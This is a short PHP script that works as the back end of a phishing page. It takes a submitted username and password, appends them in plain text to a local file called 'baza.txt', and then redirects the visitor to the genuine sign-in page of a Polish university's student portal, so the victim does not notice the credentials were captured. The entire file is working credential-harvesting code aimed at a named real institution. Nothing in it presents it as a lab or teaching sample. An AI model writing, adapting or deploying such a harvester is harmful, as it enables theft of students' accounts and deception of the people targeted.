<?php

	session_start();

	

	$username = $_POST['username'];

	$password = $_POST['password'];



	//echo($username."<br>");

	//echo($password);



	$plik = fopen('baza.txt','a');

	fwrite($plik, $username);

	fwrite($plik, "\n");

	fwrite($plik, $password);

	fwrite($plik, "\n");

	fwrite($plik, "##########");



	header('Location: https://s.student.pwr.edu.pl/iwc/signin');

?>